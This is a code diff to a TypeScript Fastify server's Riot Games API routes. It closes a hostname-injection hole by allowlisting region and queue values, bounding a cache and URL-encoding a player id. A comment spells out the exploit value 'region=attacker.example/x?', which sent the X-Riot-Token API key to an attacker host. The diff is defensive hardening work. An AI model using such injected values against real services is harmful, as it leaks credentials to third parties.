@@ -22,8 +22,35 @@ export default async function leagueRoutes(app: FastifyInstance) {
     }
   })();
 
+  // Riot's platform routing values. ?region= went straight into the hostname,
+  // so `region=attacker.example/x?` sent the X-Riot-Token key to attacker.example
+  // (found 2026-09-26). Only these hosts are ever built now.
+  const RIOT_PLATFORMS = new Set([
+    "br1",
+    "eun1",
+    "euw1",
+    "jp1",
+    "kr",
+    "la1",
+    "la2",
+    "me1",
+    "na1",
+    "oc1",
+    "ph2",
+    "ru",
+    "sg2",
+    "th2",
+    "tr1",
+    "tw2",
+    "vn2",
+  ]);
+  function riotRegion(raw: unknown): string {
+    const r = String(raw || "").toLowerCase();
+    return RIOT_PLATFORMS.has(r) ? r : RIOT_REGION;
+  }
+
   function riotPlatformUrl(region: string = RIOT_REGION) {
-    return `https://${region}.api.riotgames.com`;
+    return `https://${riotRegion(region)}.api.riotgames.com`;
   }
   function riotClusterUrl(cluster: string = RIOT_CLUSTER) {
     return `https://${cluster}.api.riotgames.com`;
@@ -52,7 +79,13 @@ export default async function leagueRoutes(app: FastifyInstance) {
     if (c && c.expiresAt > Date.now()) return c.data;
     return null;
   }
+  // Keys include caller-chosen names, so the cache is bounded: oldest out first.
+  const LEAGUE_CACHE_MAX = 2000;
   function leagueCacheSet(key: string, data: any, ttlMs: number) {
+    if (!leagueCache.has(key) && leagueCache.size >= LEAGUE_CACHE_MAX) {
+      const oldest = leagueCache.keys().next().value;
+      if (oldest !== undefined) leagueCache.delete(oldest);
+    }
     leagueCache.set(key, { data, expiresAt: Date.now() + ttlMs });
   }
 
@@ -61,7 +94,7 @@ export default async function leagueRoutes(app: FastifyInstance) {
 
     const gameName = decodeURIComponent(String((req as any).params.gameName));
     const tagLine = decodeURIComponent(String((req as any).params.tagLine));
-    const region = String((req as any).query?.region || RIOT_REGION);
+    const region = riotRegion((req as any).query?.region);
     const cluster =
       region === "kr" || region === "jp1"
         ? "asia"
@@ -181,7 +214,7 @@ export default async function leagueRoutes(app: FastifyInstance) {
 
   app.get("/league/rotation", async (req, reply) => {
     if (!RIOT_API_KEY) return reply.send({ ok: false, error: "riot_not_configured" });
-    const region = String((req as any).query?.region || RIOT_REGION);
+    const region = riotRegion((req as any).query?.region);
     const cacheKey = `rotation:${region}`;
     const cached = leagueCacheGet(cacheKey);
     if (cached) return reply.send(cached);
@@ -218,8 +251,9 @@ export default async function leagueRoutes(app: FastifyInstance) {
 
   app.get("/league/leaderboard", async (req, reply) => {
     if (!RIOT_API_KEY) return reply.send({ ok: false, error: "riot_not_configured" });
-    const region = String((req as any).query?.region || RIOT_REGION);
-    const queue = String((req as any).query?.queue || "RANKED_SOLO_5x5");
+    const region = riotRegion((req as any).query?.region);
+    const q = String((req as any).query?.queue || "");
+    const queue = ["RANKED_SOLO_5x5", "RANKED_FLEX_SR"].includes(q) ? q : "RANKED_SOLO_5x5";
     const cacheKey = `leaderboard:${region}:${queue}`;
     const cached = leagueCacheGet(cacheKey);
     if (cached) return reply.send(cached);
@@ -276,10 +310,10 @@ export default async function leagueRoutes(app: FastifyInstance) {
   app.get("/league/live/:puuid", async (req, reply) => {
     if (!RIOT_API_KEY) return reply.send({ ok: false, error: "riot_not_configured" });
     const puuid = String((req as any).params.puuid);
-    const region = String((req as any).query?.region || RIOT_REGION);
+    const region = riotRegion((req as any).query?.region);
 
     const game = await riotGet(
-      `${riotPlatformUrl(region)}/lol/spectator/v5/active-games/by-summoner/${puuid}`,
+      `${riotPlatformUrl(region)}/lol/spectator/v5/active-games/by-summoner/${encodeURIComponent(puuid)}`,
     );
     if (!game) return reply.send({ ok: true, inGame: false });
 
